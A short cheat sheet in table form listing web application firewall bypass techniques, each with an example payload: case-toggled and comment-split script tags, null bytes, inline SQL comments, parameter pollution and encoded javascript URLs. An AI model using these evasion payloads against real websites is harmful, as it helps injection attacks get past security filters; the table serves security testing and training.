# WAF Bypass Techniques

| Technique                  | Example                                            | Purpose                                      |
|---------------------------|----------------------------------------------------|----------------------------------------------|
| Case Toggling             | `<ScrIpT>confirm()</sCRiPt>`                       | Change casing to bypass filters              |
| Using Comments            | `<!--><script>confirm/**/()/**/</script>`          | Inject comments to disrupt parsing           |
| Null Character Injection  | `%00`                                              | Disrupt WAF parser                           |
| Inline Comments           | `/*!SELECT*/`                                      | Break keyword detection                      |
| HTTP Parameter Pollution  | `?id=1&id=2`                                       | Confuse parameter parsers                    |
| Keyword Splitting         | `SEL<ECT>`                                         | Split keywords                               |
| Character Reference Encoding | `<a href=j&#97v&#97script&#x3A;&#97lert(1)>`   | Use ASCII/hex refs                           |
| Junk Characters           | `<script>+-+-1-+-+alert(1)</script>`               | Add noise to mask intent                     |
| WAF Auto-Learning         | N/A                                                | Exploit adaptive behavior                    |
